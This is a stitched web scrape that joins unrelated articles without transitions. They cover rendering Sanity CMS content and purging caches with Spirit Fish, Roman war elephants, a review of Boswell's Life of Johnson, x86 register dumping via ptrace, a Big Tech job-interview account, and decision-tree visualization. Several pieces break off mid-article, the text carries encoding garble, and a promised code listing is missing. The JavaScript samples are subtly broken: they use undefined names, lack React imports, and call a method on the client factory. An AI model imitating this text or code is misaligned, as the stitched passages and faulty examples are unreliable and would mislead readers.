 functionality, personally weâ€™d never use anything else!</p>

<p>So, itâ€™s only natural Spirit Fish would integrate nicely. Hereâ€™s a few of the ways we work with Sanity:</p>

<h2><strong>1. Rendering Sanity content for great SEO, Google Lighthouse Scores, and low FMP</strong></h2>

<p>Sanity is a headless CMS, so that means that in order to display data to end users, content needs to be loaded over HTTP. While thereâ€™s a bunch of framework dependent approaches to this, we prefer to load the data in the same javascript bundle that powers our React.js projects. </p>

<p>Hereâ€™s a trivial example using 
      <a target="_blank" href="https://reactjs.org/docs/create-a-new-react-app.html">create-react-app</a>
:</p>

<pre><code>
import React from "react";
import SanityClient from "@sanity/client";

const sanityClient = SanityClient({
  projectId: "zp7mbokg",
  dataset: "production",
  useCdn: true
});

const query = `*[_type == "movie"] {
  _id,
  title
}[0...50]`;

function App() {
  const [movies, setMovies] = useState(null);

  useEffect(async () =&gt; {
    setMovies(await sanity.fetch(query));
  }, []);

  return (
    &lt;ul&gt;
      {movies.map(movie =&gt; (
        &lt;li key={movie._id}&gt;
          {movie.title}
        &lt;/li&gt;
      ))}
    &lt;/ul&gt;
  );
};

export default App;

</code></pre>

<p>If you deploy a create-react-app to a host like an S3 bucket, etc - when you view-source, youâ€™ll notice that your movies arenâ€™t there. Thatâ€™s because that content is loaded at the runtime! When Googleâ€™s crawler indexes your site, it will only see a blank page, and all of your end users wonâ€™t see any content until theyâ€™ve downloaded your javascript, and THEN loaded the Sanity query. Thatâ€™s no good for SEO, or conversions.</p>

<p>Of course, this is our bread and butter: create a Spirit Fish renderer, point it at that S3 bucket, and point your DNS at our CDN. Refresh your site, and boom! Your site is now rendered on the fly.</p>

<p>We find that adding a Spirit Fish renderer to a site usually doubles your 
      <a target="_blank" href="https://developers.google.com/web/tools/lighthouse">Google Lighthouse</a>
 scores, so thatâ€™s a big win for 5 minutes of setup!</p>

<h2><strong>2. Purging the entire Spirit Fish cache when content changes in Sanity</strong></h2>

<p>On first request - our renders take a few seconds - so we cache the result in a global CDN so that your rendered site is close to your users. </p>

<p>Got it! But what if my content changes?</p>

<p>Well - youâ€™ll need to trigger an invalidation in Spirit Fish. The easiest way to do this for small sites is to trigger a full invalidation. This will force your site to be re-rendered the next time your users visit, meaning your new data will be pulled from Sanity!</p>


<p>Thatâ€™s what we built our invalidations API for. Hereâ€™s what your `invalidate_all` endpoint looks like:</p>

<pre>  <code>
https://www.spirit.fish/api/v1/renderers/$RENDERER_ID/invalidate_all?api_key=$RENDERER_API_TOKEN
  </code>
</pre>

<p>This endpoint takes a `POST` request, so you can easily add it directly to Sanityâ€™s management portal, no code required:</p>

<a href="https://www.sanity.io/docs/webhooks" target="_blank">
  <p><img src="https://www.spirit.fish/assets/blog_posts/sanity_logo_square-7b9b2a49f4583770b16f9e4898285e61afa005dd41fa9e93e2e89b8d5b446cb1.jpg">

      <p>https://www.sanity.io/docs/webhooks</p>
    </div>
  </div>
</a>

<p>Now, whenever an editor updates content in Sanity, it will clear your Spirit Fish cache, easy as that!</p>

<h2><strong>3. Purging specific Spirit Fish pages when Sanity content changes with a serverless function</strong></h2>

<p>For small projects with a handful of pages, the above is probably fine - but when you have a large project (say an editorial with hundreds of pages), you wouldnâ€™t want to purge the entire Spirit Fish if only one page has changed.</p>

<p>In cases like this, youâ€™ll need your own backend endpoint to manage cache invalidations. We like serverless functions for this:</p>

<pre><code>
import SanityClient from '@sanity/client';
import handleError from 'utils/services/handleError';
import notEmpty from 'utils/notEmpty';

const sanityClient = SanityClient({
  projectId: "zp7mbokg",
  dataset: "production",
  useCdn: true
});

const buildCacheClearPathForRecord = (record) =&gt; {
  switch (record._type) {
    case 'movie':
      return `/movies/${record.slug}`;
    case 'director':
      return `/directors/${record.slug}`;
  }
};

export default async (request, response) =&gt; {
  try {
    const records =
      await SanityClient.getDocuments(request.body.ids.all);
    const pages =
      records.filter(notEmpty).map(buildCacheClearPathForRecord);

    await fetch(`https://www.spirit.fish/api/v1/renderers/${process.env.RENDERER_ID}/api_invalidations`, {
      method: 'post',
      body: JSON.stringify({
        invalidation: { pages }
      }),
      headers: {
        'X-Hatchery-Renderer-Api-Key': process.env.RENDERER_API_KEY,
        'Content-Type': 'application/json'
      }
    });
    return response.end();
  } catch (e) {
    return handleError(request, response, e);
  }
};

</code></pre>

<p>Deploy your serverless function (we like 
      <a target="_blank" href="https://firebase.google.com/">Firebase</a>
 or 
      <a target="_blank" href="https://vercel.com/">Vercel</a>
), and setup your Sanity webhook (like we did above - don't forget the enviornment variables!) to hit this endpoint instead. Bingo! Youâ€™re now invalidating individual pages as content changes; eliminating the need for site wide rerenders, and keeping your content in cache for as long as possible.</p>



    <p>Spirit Fish is free to try, and each renderer comes with a generous free tier that should cover most hobby projects.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Today, in Part II of our three part series on War Elephants, we’re going to look at the drawbacks of war elephants.  Last time (<a href="https://acoup.blog/2019/07/26/collections-war-elephants-part-i-battle-pachyderms/">here</a>), we discussed the factors that made war elephants so powerful on the battlefield.  To recap: war elephants had a strong psychological element (they are very scary) and could drastically disrupt both infantry and cavalry alike, leaving them easy pickings for forces supporting the war elephant.  Those uses made war elephants popular not only in India, where they were first developed, but among Alexander the Great’s successors, and even as far west as Carthage.  <a href="https://acoup.blog/2019/08/09/collections-war-elephants-part-iii-elephant-memories/">And next time, we’ll look at why elephants <em>remained</em> popular in India</a>, despite the drawbacks we’ll discuss today.</p>



<p>The best way to think about the weaknesses of war elephants is to look at the question with a specific context, so we are going to narrow in on one of the two key areas where war elephants did not last as a weapon system: the Roman world (both the period of the Republic and the Empire).  As I mentioned in the last post, by the Imperial period, the Romans seem to have decided that elephants were not worth the trouble and discontinued their use.  Roman military writers routinely disparage elephants (we’ll see why) as weapons of war and despite the fact that Rome absorbed not one but <em>three</em> states which actively used elephants in war (Carthage, the Ptolemaic and Seleucid Kingdoms) – and thus we may assume three sets of capture, training and breeding programs for maintaining the animals – they did not continue their use.  It is one thing not to adopt a foreign weapon, it is quite another to inherit the entire production complex and still say, “no, not for me.”</p>

Until then: <strong>Sparta is terrible.</strong></figcaption></figure>



<p>So today we’re going to ask, “why?”  We’ve answered that question in the immediate term – to quote Trautmann (2015) on the point, “the Roman refusal of the war elephant..was based upon a low estimate of its value” (250).  To put another way, they thought they sucked.  We know elephants <em>could</em> be quite potent in battle, so the answer must be a touch more complicated.  We’ll look at this two ways: first (because it’s me) in terms of <em><strong>logistics</strong></em>, and then in terms of anti-elephant <em><strong>tactics</strong></em>, to see why elephants could not succeed against (or with) Rome.  I am also going to speculate – just a touch – on which of these factors might explain the other major area elephant warfare did not penetrate: China.</p>



<h2>Roman Elephants</h2>



<p>But first, a necessary caveat to an objection no doubt already brewing in the minds of some: but didn’t the Romans use elephants sometimes?  Yes, though Roman employment of elephants was at best uneven (this is a point, I’d like to note, where Trautmann (2015) shows its value over, for instance, J. M. Kistler’s <em>War Elephants </em>(2006) – the latter’s reading of Roman use of war elephants bends the evidence to serve an argument, rather than the other way around).  Nevertheless, the Romans did use war elephants during the last two centuries of the Republic.</p>



<p>The Romans had some war elephants (just 20) at Cynocephelae (197 B.C.) against Macedon – these had been drawn from the kingdom of Numidia, which had sided with Rome against Carthage in the Second Punic War.  Plutarch (<em>Flam</em>. 8.2-5) leaves the animals out of the battle narrative, but Livy (who is the better source; Liv. 33.9) notes their use to break up the Macedonian right wing, which was not yet even in fighting formation.  It’s not clear the elephants were necessary for the Roman victory here and the key action was actually a flanking attack by infantry.</p>



<p>The Romans brought elephants to Magnesia (190 B.C.), but left them in reserve; the Romans only had a few, whereas their Seleucid opponents had brought many more.  Moreover, the Roman elephants were smaller African elephants, effectively useless against the large Asian elephants the Seleucids used.  Pydna (168 B.C.) against the Macedonians again, is harder to assess because the sources for it are poor (part of Livy’s narrative of the battle is lost).  Plutarch (<em>Aem.</em> 19-22) leaves the elephants out again, whereas Livy stops to expressly say they were useless.  Kistler (himself reliant on other scholars to read the Latin for him) reads this as the elephants being the decisive element; the sources cannot support this reading.  Livy – who appears to be quoting Polybius, a contemporary of the battle – is quite clear what he thinks of the elephants, “For as new inventions often have great force in the words of men, but when tried, when they need to work, and not just have their working described, they evaporate without any effect – just so the war elephants were just a name without any real use.” (<a href="http://www.perseus.tufts.edu/hopper/text?doc=Perseus%3Atext%3A1999.02.0211%3Abook%3D44%3Achapter%3D41">Liv 44.41.4</a>, my rough translation).</p>

<p>The Romans did find elephants useful in places like Spain or southern Gaul (modern Provence) where just a handful could bewilder and terrify opponents completely unused to and unprepared for them.  The last gasp of true Roman war elephants came in 46 B.C., where Julius Caesar defeated a Roman army led by Metellus Scipio which had sixty elephants in it.  The elephants lost and one of Caesar’s legions (my personal favorite, Legio V Alaudae (Larks!)) took the elephant as a legionary symbol in commemoration of having beaten them.</p>



<p>So absolutely yes, the Romans of the Middle and Late Republic made some use of war elephants, but it was hardly a distinguished run.  As Trautmann notes – quite correctly, in my view – the Romans were always more interested in ways to defeat elephants than to use them.  Which brings us back to our question: elephants are <strong>awesome</strong>, Romans are <em>also awesome</em>…so why didn’t the Romans like elephants?</p>



<h2>Elephant Logistics</h2>



<p>From trunk to tail, elephants are a logistics <em>nightmare</em>.</p>



<p>And that begins almost literally at birth.  For areas where elephants are native, nature (combined, typically, with the local human terrain) create a local ‘supply.’  In India this meant the elephant forests of North/North-Eastern India; the range of the North African elephant (<em>Loxodonta africana pharaohensis</em>, the most likely source of Ptolemaic and Carthaginian war elephants) is not known.  Thus for many elephant-wielding powers, trade was going to always be a key source for the animals – either trade with far away kingdoms (the Seleucids traded with the Mauyran Indian kingdom for their superior Asian elephants) or with thinly ruled peripheral peoples who lived in the forests the elephants were native to.</p>



<p>(We’re about to get into some of the specifics of elephant biology.  If you are curious on this topic, I am relying heavily on R. Sukumar, <em>The Asian Elephant: Ecology and Management</em> (1989).  I’ve found that information on Asian elephants (<em>Elephas maximus</em>) <strong>much</strong> easier to come by than information on African elephants (<em>Loxodonta africana</em> and <em>Loxodonta cyclotis</em>).)</p>



<p>In that light, creating a breeding program – as was done with horses – seems like a great idea.  Except there is one major problem: a horse requires about four years to reach maturity, a mare gestates a foal in eleven months and can go into heat almost immediately thereafter.  By contrast, elephants reach adulthood after seventeen years, take 18-22 months to gestate and female elephants do not typically mate until their calf is weaned, four to five years after its birth.  A ruler looking to build a stable of cavalry horses thus may start small and grow rapidly; a ruler looking to build a corps of war elephants is looking at a very slow process.  This is compounded by the fact that elephants are notoriously difficult to breed in captivity.  There is some speculation that the Seleucids nonetheless attempted this at Apamea, where they based their elephants – in any event, they seem to have remained dependent on imported Indian elephants to maintain the elephant corps.  If a self-sustaining elephant breeding program for war elephants was ever created, we do not know about it.</p>



<p>To make matters <em>worse</em>, elephants require <strong>massive</strong> amounts of food and water.  In video-games, this is often represented through a high elephant ‘upkeep’ cost – but this often falls well short of the reality of keeping these animals for war.  Let’s take <em>Total War: Rome II</em> as an example: a unit of Roman (auxiliary) African elephants (12 animals), costs 180 upkeep, compared to 90 to 110 upkeep for 80 horses of auxiliary cavalry (there are quite a few types) – so one elephant (with a <em>mahout</em>) costs 15 upkeep against around 1.25 for a horse and rider (a 12:1 ratio).  Paradox’s <em>Imperator</em> does something similar, with a single unit of war elephants requiring 1.08 upkeep, compared to just 0.32 for light cavalry; along with this, elephants have a heavy ‘supply weight’ – twice that of an equivalent number of cavalry (so something like a 2:1 or 3:1 ratio of cost).</p>

<p>Believe it or not, this <em>understates</em> just how hungry – and expensive – elephants are.  The standard barley ration for a Roman horse was 7kg of barley per day (7 Attic medimnoi per month; Plb. 6.39.12); this would be supplemented by grazing.  Estimates for the food requirements of elephants vary widely (in part, it is hard to measure the dietary needs of grazing animals), but elephants require in excess of 1.5% of their body-weight in food <em>per day</em>.  …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Boswell's <em>Life of Johnson</em> is not just one of my favorite books, it also engendered some of my favorite book reviews. While praise for the work is universal, the main question commentators try to answer is this: how did the worst man in the world manage to write the best biography?</p><p>Who was James Boswell? He was a perpetual drunk, a degenerate gambler, a sex addict, whoremonger, exhibitionist, and rapist. He gave his wife an STD he caught from a prostitute.</p><p>Selfish, servile and self-indulgent, lazy and lecherous, vain, proud, obsessed with his aristocratic status, yet with no sense of propriety whatsoever, he frequently fantasized about the feudal affection of serfs for their lords. He loved to watch executions and was a proud supporter of slavery.</p><p>“Where ordinary bad taste leaves off,” John Wain comments, “Boswell began.” The Thrales were long-time friends and patrons of Johnson; a <em>single day</em> after Henry Thrale died, Boswell wrote a poem fantasizing about the elderly Johnson and the just-widowed Hester: "Convuls'd in love's tumultuous throws, / We feel the aphrodisian spasm". The rest of his verse is of a similar quality; naturally he considered himself a great poet.</p><p>Boswell combined his terrible behavior with a complete lack of shame, faithfully reporting every transgression, every moronic ejaculation, every faux pas. The first time he visited London he went to see a play and, as he happily tells us himself, he "entertained the audience prodigiously by imitating the lowing of a cow."</p><p>By all accounts, including his own, he was an idiot. On a tour of Europe, his tutor said to him: "of young men who have studied I have never found one who had so few ideas as you."</p><p>As a lawyer he was a perpetual failure, especially when he couldn't get Johnson to write his arguments for him. As a politician he didn't even get the chance to be a failure despite decades of trying.</p><p>His correspondence with Johnson mostly consists of Boswell whining pathetically and Johnson telling him to get his shit together.</p><p>He commissioned a portrait from his friend Joshua Reynolds and stiffed him on the payment. His descendants hid the portrait in the attic because they were ashamed of being related to him.</p><p>Desperate for fame, he kept trying to attach himself to important people, mostly through sycophancy. In Geneva he pestered Rousseau,<span><a href="#fn10521873801" rel="footnote"><sup id="fnref10521873801">1</sup></a></span> leading to this conversation:</p><blockquote><p>Rousseau: You are irksome to me. It’s my nature. I cannot help it.<br>Boswell: Do not stand on ceremony with me.<br>Rousseau: Go away.</p></blockquote><p>Later, Boswell was given the task of escorting Rousseau's mistress Thérèse Le Vasseur to England—they had an affair on the way.</p><p>When Adam Smith and Edward Gibbon were elected to The Literary Club, Boswell considered leaving because he thought the club had now "lost its select merit"!</p><p>On the positive side, his humor and whimsy made for good conversation; he put people at ease; he gave his children all the love his own father had denied him; and, somehow, he wrote one of the great works of English literature.</p><p><em>The Life of Samuel Johnson, LL.D.</em> was an instant sensation. While the works of Johnson were quickly forgotten,<span><a href="#fn10521873802" rel="footnote"><sup id="fnref10521873802">2</sup></a></span> his biography has never been out of print in the 229 years since its initial publication. It went through 41 editions just in the 19th century.</p><p>Burke told King George III that he had never read anything more entertaining. Coleridge said "it is impossible not to be amused with such a book." George Bernard Shaw compared Boswell's dramatization of Johnson to Plato's dramatization of Socrates, and placed old Bozzy in the middle of an "apostolic succession of dramatists" from the Greek tragedians through Shakespeare and ending, of course, with Shaw himself.</p><p>It is a strange work, an experimental collage of different modes: part traditional biography, part collection of letters, and part direct reports of Johnson's life as observed by Boswell.<span><a href="#fn10521873803" rel="footnote"><sup id="fnref10521873803">3</sup></a></span> His inspiration came not from literature, but from the minute naturalistic detail of Flemish paintings. It is difficult to convey its greatness in compressed form: Boswell is not a great writer at the sentence level, and all the famous quotes are Johnsonian <em>bon mots</em>. The book succeeds through a cumulative effect.</p><p>Johnson was 54 years old when he first met Boswell, and most of his major accomplishments (the poetry, the dictionary, <em>The Rambler</em>) were behind him; his wife had already died; he was already the recipient of a £300 pension from the King; his edition of Shakespeare was almost complete. All in all they spent no more than 400 days together. Boswell had limited material to work with, but what he doesn't capture in fact, he captures in feeling: an entire life is contained in this book: love and friendship, taverns and work, the glory of success and recognition, the depressive bouts of failure and penury, the inevitable tortures of aging and death.</p><p>Out of a person, Boswell created a literary personality. His powers of characterization are positively Shakespearean, and his Johnson resembles none other but the bard's greatest creation: Sir John Falstaff. Big, brash, and deeply flawed, but also lovable. He would "laugh like a rhinoceros":</p><blockquote><p>Johnson could not stop his merriment, but continued it all the way till he got without the Temple-gate. He then burst into such a fit of laughter that he appeared to be almost in a convulsion; and in order to support himself, laid hold of one of the posts at the side of the foot pavement, and sent forth peals so loud, that in the silence of the night his voice seemed to resound from Temple-bar to Fleet ditch.</p></blockquote><p>And around Johnson he painted an entire dramatic cast, bringing 18th century London to life: Garrick the great actor, Reynolds the painter, Beauclerk with his banter, Goldsmith with his insecurities. Monboddo and Burke, Henry and Hester Thrale, the blind Mrs Williams and the Jamaican freedman Francis Barber.</p><p>Borges (who was also a big fan) finds his parallels not in Shakespeare and Falstaff, but in Cervantes and Don Quixote. He (rather implausibly) suggests that every Quixote needs his Sancho, and "Boswell appears as a despicable character" deliberately to create a contrast.<span><a href="#fn10521873804" rel="footnote"><sup id="fnref10521873804">4</sup></a></span></p><p>And in the 1830s, two brilliant and influential reviews were written by two polar opposites: arch-progressive Thomas Babington Macaulay and radical reactionary Thomas Carlyle. The first thing you'll notice is their sheer magnitude: <a href="https://oll-resources.s3.amazonaws.com/titles/362/1227.01_Bk.pdf" target="_blank" rel="noopener">Macaulay's</a> is 55 pages long, while <a href="https://sci-hub.se/https://doi.org/10.1017/CBO9780511697234.003" target="_blank" rel="noopener">Carlyle's review in Fraser's Magazine</a> reaches 74 pages!<span><a href="#fn10521873805" rel="footnote"><sup id="fnref10521873805">5</sup></a></span> And while they both agree that it's a great book and that Boswell was a scoundrel, they have very different theories about what happened.</p><h2 id="Macaulay"><a href="#Macaulay" title="Macaulay"></a>Macaulay</h2><p>Never in history, Macaulay says, has there been "so strange a phænomenon as this book". On the one hand he has effusive praise:</p><blockquote><p>Homer is not more decidedly the first of heroic poets, Shakspeare is not more decidedly the first of dramatists, Demosthenes is not more decidedly the first of orators, than Boswell is the first of biographers. He has no second. He has distanced all his competitors so decidedly that it is not worth while to place them.</p></blockquote><p>On the other hand, he spends several paragraphs laying into Boswell with gusto:</p><blockquote><p>He was, if we are to give any credit to his own account or to the united testimony of all who knew him, a man of the meanest and feeblest intellect. [...] He was the laughing-stock of the whole of that brilliant society which has owed to him the greater part of its fame. He was always laying himself at the feet of some eminent man, and begging to be spit upon and trampled upon. [...] Servile and impertinent, shallow and pedantic, a bigot and a sot, bloated with family pride, and eternally blustering about the dignity of a born gentleman, yet stooping to be a talebearer, an eavesdropper, a common butt in the taverns of London.</p></blockquote><p>Macaulay's theory is that while Homer and Shakespeare and all the other greats owe their eminence to their virtues, Boswell is unique in that he owes <em>his</em> success to his vices.</p><blockquote><p>He was a slave, proud of his servitude, a Paul Pry, convinced that his own curiosity and garrulity were virtues, an unsafe companion who never scrupled to repay the most liberal hospitality by the basest violation of confidence, a man without delicacy, without shame, without sense enough to know when he was hurting the feelings of others or when he was exposing himself to derision; and because he was all this, he has, in an important department of literature, immeasurably surpassed such writers as Tacitus, Clarendon, Alfieri, and his own idol Johnson.</p></blockquote><blockquote><p>Of the talents which ordinarily raise men to eminence as writers, Boswell had absolutely none. There is not in all his books a single remark of his own on literature, politics, religion, or society, which is not either commonplace or absurd. [...] Logic, eloquence, wit, taste, all those things which are generally considered as making a book valuable, were utterly wanting to him. He had, indeed, a quick observation and a retentive memory. These qualities, if he had been a man of sense and virtue, would scarcely of themselves have sufficed to make him conspicuous; but, because he was a dunce, a parasite, and a coxcomb, they have made him immortal.</p></blockquote><p>The work succeeds partly because of its subject: if Johnson had not been so extraordinary, then airing all his dirty laundry would have just made him look bad.</p><blockquote><p>No man, surely, ever published such stories respecting persons whom he professed to love and revere. He would infallibly have made his hero as contemptible as he has made himself, had not his hero really possessed some moral and intellectual qualities of a very high order. The best proof that Johnson was really an extraordinary man is that his character, instead of being degraded, has, on the whole, been decidedly raised by a work in which all his vices and weaknesses are exposed.</p></blockquote><p>And finally, Boswell provided Johnson with a curious form of literary fame:</p><blockquote><p>The reputation of [Johnson's] writings, which he probably expected to be immortal, is every day fading; while those peculiarities of manner and that careless …</p></blockquote></div></div>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/cpu-context-switch.svg" alt="Context Switch"></p>

<p>In this article, I would like to shortly describe the methods used
to dump and restore the different kinds of registers on 32-bit
and 64-bit x86 CPUs.  The first part will focus on General Purpose
Registers, Debug Registers and Floating-Point Registers up to the XMM
registers provided by the SSE extension.  I will explain how their
values can be obtained via the <code>ptrace(2)</code> interface.</p>

<p>The <code>ptrace(2)</code> API is commonly used in all modern BSD systems
and Linux, as all of them derive it from the original form designed
and implemented in 4.3BSD.  The primary focus in this article is
on the FreeBSD and NetBSD systems.  Nevertheless, the users of other
Operating Systems such as OpenBSD, DragonFly BSD or Linux can still
benefit from this article as the basic principles are the same
and the code examples are intended to be easily adapted to other
platforms.</p>

<p>A single CPU (in modern hardware: CPU core or CPU thread,
if hyperthreading is available) can execute only one program thread
at a time.  In order to be able to run multiple processes and threads
quasi-simultaneously, the Operating System must perform <em>context
switching</em> — that is periodically suspend the currently running thread,
save its state, restore the saved state of another thread and resume it.
Saving and restoring the values of the processor’s registers play
an important part in context switching.  It is important that
this process is fully transparent to the process being switched,
and in a properly implemented kernel there should be no side effects
that are perceptible to the program.</p>

<p>The debugger may need to examine the register sets of the debugged
program for a number of reasons.  By inspecting the Program Counter,
it is able to determine the location in source code at which
the execution will continue, and by altering it it can control
the execution.  The Stack Pointer is necessary to introspect variables
stored on the stack, while the remaining registers can hold variables
themselves.</p>

<p>A special set of the x86 registers are the Debug Registers.  They are
not accessible to the program itself; however, they can be read
or written by the debugger.  They allow setting hardware assisted
breakpoints (instruction execute trap) on the code being executed,
and watchpoints (read and/or write operation trap) on the variables.</p>

In the narrower sense, it means the few (8 on i386, 16 on amd64)
baseline registers that can be used to store arbitrary data (usually
integers or pointers).  In the wider sense it means all baseline
registers in the processor architecture, historically excluding
floating-point registers and special kinds of registers.  On x86, this
includes the ‘narrower sense’ general-purpose registers, the Program
Counter (EIP/RIP), segment registers and the flag register.</p>

<p>The majority of the General Purpose Registers can be copied directly,
e.g. using the <code>MOV</code> instruction, or pushed onto the stack
via <code>PUSH</code>.  The EIP/RIP register can be copied using the <code>LEA</code>
instruction, and restored via <code>JMP</code>.  The flag register can be pushed
onto the stack via <code>PUSHFD</code>/<code>PUSHFQ</code>, and afterwards popped from it
via <code>POPFD</code>/<code>POPFQ</code>.</p>

<p>The listing below demonstrates a program that grabs the values of all
amd64 GPRs at an arbitrary point during the execution and prints them
after returning from assembly.</p>

<h3 id="the-gpr-ptrace-2-api">The GPR ptrace(2) API</h3>

<p>Both FreeBSD and NetBSD use the <code>PT_GETREGS</code> request to get the values
of GPRs from the program, and <code>PT_SETREGS</code> to update them.
The requests take a pointer to <code>struct reg</code> as an argument.</p>

<p>On FreeBSD, both i386 and amd64 have the individual registers listed
as fields of the struct.  On NetBSD, i386 uses a regular structure,
while amd64 puts all values into an array whose indices are defined
in the headers as constants.</p>

<p>The listing below compares the structures used on FreeBSD and NetBSD.
Note that NetBSD/amd64 uses a special macro.  For example,
<code>greg(rdi RDI, 0)</code> defines <code>_REG_RDI</code>.</p>

              <article>

<p>Welcome back! Let’s continue the previous post on my <a href="https://jmmv.dev/2020/10/bye-google-hi-microsoft.html">reasons for moving from Google to Microsoft</a> by looking at my whole interviewing process. I’ve been asked by a few peers to narrate this story because they are curious to know how this process looked like for a person with 10+ years of professional experience. And, well, it’s just a topic I wanted to write about anyway 😉.</p>

<p>As a reminder, and to pique your interest, I applied for:</p>

<ul>
<li>🟦 a Software Engineer (SWE) position at Facebook;</li>
<li>🟦 a Production Engineer (PE) position at Facebook;</li>
<li>⚫ a Software Engineer (SWE) position at Twitter in their Build Efficiency team;</li>
<li>💚 a Principal Software Engineer (SDE) position at Microsoft in their Azure Data product; and</li>
<li>💚 a Principal Software Engineer (SDE) position at Microsoft in their Azure Storage product.</li>
</ul>

<p>That’s a total of 5 applications and talks with ~40 different people. Of those, the position in Azure Data vanished before I even interviewed, but I successfully <em>got to the offer stage for the other 4</em>. I entered this whole endeavor fixated on joining Facebook but… along the way, I uncovered exciting opportunities throughout, making my choice exceedingly difficult. In the end, I swerved towards the Azure Storage position for various reasons, but it’d have gone either way.</p>

<p>In this post, I want to be as honest and open as possible about <em>my personal situation</em> and how it related to the processes. As a result, some of the things I say might sound like a borderline rant—but that’s not the intention. Lastly, remember that interviewing always comes with the need to sign an NDA, so I cannot go into a lot of details.</p>



<p>Before we get into the processes, let’s talk about… career ladder <em>levels</em>! Uh, so exciting.</p>

<p>Levels are a very important topic for this discussion because each of the positions I applied to was attached to a specific level. The positions’ level significantly influenced how I went about zeroing in on my final choice. Beware that my view on this topic is through Google-tinted glasses and doesn’t necessarily apply to all companies—although I believe it does for the companies I talked to.</p>

<p>You see, recruiters and higher-level peers will often tell you not to get obsessed with levels or promotion: <em>“levels don’t matter”</em>, they’ll happily say. In principle, the people you work with know how you work in practice so the level you are at is irrelevant, and higher compensation can be achieved without promotion. Yes, compensation is weird: you can be paid more at a lower level by constantly exceeding expectations than at a higher level by just cruising.</p>

<p>In reality, however, I believe levels <em>do</em> matter a lot, even for an Individual Contributor (IC, non-manager) position. Here is why:</p>

<ul>
<li><p>Being at a higher level influences the kind of opportunities you are <em>exposed</em> to work on. You’d like to think that expertise and recognition do that instead: and they definitely do, but only within the realm of your team. Once you have to deal with teams and managers that don’t know you personally, the level you hold conveys that information. And thus the same applies when you land at a new company where nobody knows anything about you.</p></li>

<li><p>Being at a higher level grants you extra responsibilities and expectations—and I say <em>grant</em> because I think those are great traits. I personally want to grow in these areas, and I know that getting a higher title will subconsciously influence me to behave differently, just as it happened once I go the not-officially-recognized Tech Lead job within my team.</p></li>
</ul>

<p>NOTE: This is a good chance to visit <a href="https://www.levels.fyi/">levels.fyi</a>. Familiarize yourself with how levels map across companies and how they overlap across them. What’s <strong>not</strong> depicted there are the actual responsibilities of each level, nor that level compensation bans overlap <em>within a company</em>.</p>

<p>You might be wondering why any of this is important during the interviewing process. In fact, if all you care about is higher compensation, then this isn’t very important.</p>

<p>For me, though, my personal situation was problematic in finding the right position. I had been at the Senior (L5) level at Google for 5 years now, trying to make the jump into Staff (L6) territory for at least 3 of those years. My management chain and direct peers had been supportive of this promotion for quite a while now, and I am convinced my work did too. As a result, my compensation matched that: I was at the top of the Senior level band.</p>

<p>This unofficial recognition, however, is not reflected anywhere: you have to believe me at face value. For anyone that doesn’t know me within or outside the company, I’m an L5—and that can mean <em>a lot</em> of different things because of how broad levels are. One might be at the lower level, struggling to keep up with the demands and being paid the bare minimum; one can be in the middle, having a comfortable and non-stressful life with a good salary; and one can be at the top, trying to make the leap into the next band.</p>

<p>Unfortunately for me, the jump into the Staff level didn’t materialize at Google, dare I say… due to process failures. Promotions are a game and it is a game I did not play well; keep that in mind if you want them. But I didn’t want the job change to <em>feel</em> like a step down. <strong>My goal was to get hired as a Google L6-equivalent position elsewhere</strong> to properly reflect my skills, to make me uncomfortable enough to grow new skills, and to not have to prove myself all over again, which would take a long time.</p>



<p>Dealing with different companies at the same time was an exhausting, but important, process. As a reminder: if you want to have any leverage during offer negotiations, you ought to have other offers on the table. In the end, and as we shall see later, these weren’t very useful for my own negotiations (other things were), but they were eye-opening as I got to witness that there are exciting opportunities everywhere.</p>

<p>Given the many people I talked to (about 40) and the length of the process, I took copious notes each time I interacted with anyone. Specifically, I captured the names of each person I talked to and what they did at each company. I also captured anything the recruiters said in order to prevent future misunderstandings, because sometimes they contradicted what others had previously said.</p>

<p>Below is the full timeline. I know it’s long but I want to show how all the processes interwove. To that end, I have color- and shape-coded entries: Facebook is 🟦, Twitter is ⚫, and Microsoft is 💚:</p>

<p>Decision trees are the fundamental building block of <a href="http://explained.ai/gradient-boosting/index.html">gradient boosting machines</a> and <a href="https://en.wikipedia.org/wiki/Random_forest">Random Forests</a>™, probably the two most popular machine learning models for structured data.  Visualizing decision trees is a tremendous aid when learning how these models work and when interpreting models.  Unfortunately, current visualization packages are rudimentary and not immediately helpful to the novice. For example, we couldn't find a library that visualizes how decision nodes split up the feature space. It is also uncommon for libraries to support visualizing a specific feature vector as it weaves down through a tree's decision nodes; we could only find one image showing this.</p>

<p>So, we've created a general package for <a href="https://github.com/scikit-learn/scikit-learn">scikit-learn</a> decision tree visualization and model interpretation, which we'll be using heavily in an upcoming <a href="https://mlbook.explained.ai/">machine learning book</a> (written with <a href="http://www.fast.ai/about/#jeremy">Jeremy Howard</a>).  Here's a sample visualization for a tiny decision tree (click to enlarge):</p>

<p><a href="https://explained.ai/decision-tree-viz/images/samples/wine-TD-2.svg"><img src="https://explained.ai/decision-tree-viz/images/samples/wine-TD-2.svg" width="70%"></a></p>

<p>This article demonstrates the results of this work, details the specific choices we made for visualization, and outlines the tools and techniques used in the implementation. The visualization software is part of a nascent Python machine learning library called <a href="https://github.com/parrt/dtreeviz">dtreeviz</a>.  We assume you're familiar with the basic mechanism of decision trees if you're interested in visualizing them, but let's start with a brief summary so that we're all using the same terminology. (If you're not familiar with decision trees, check out <a href="http://course.fast.ai/ml">fast.ai's Introduction to Machine Learning for Coders MOOC</a>.)</p>



<h2 id="sec:1.1">1.1 Decision tree review</h2>


<p>A decision tree is a machine learning model based upon binary trees (trees with at most a left and right child).  A decision tree learns the relationship between observations in a training set, represented as feature vectors <span>x</span> and target values <span>y</span>, by examining and condensing training data into a binary tree of interior nodes and leaf nodes.  (Notation: vectors are in bold and scalars are in italics.)</p>

<p>Each leaf in the decision tree is responsible for making a specific prediction. For regression trees, the prediction is a value, such as price.  For classifier trees, the prediction is a target category (represented as an integer in scikit), such as cancer or not-cancer. A decision tree carves up the feature space into groups of observations that share similar target values and each leaf represents one of these groups.  For regression, similarity in a leaf means a low variance among target values and, for classification, it means that most or all targets are of a single class.</p>

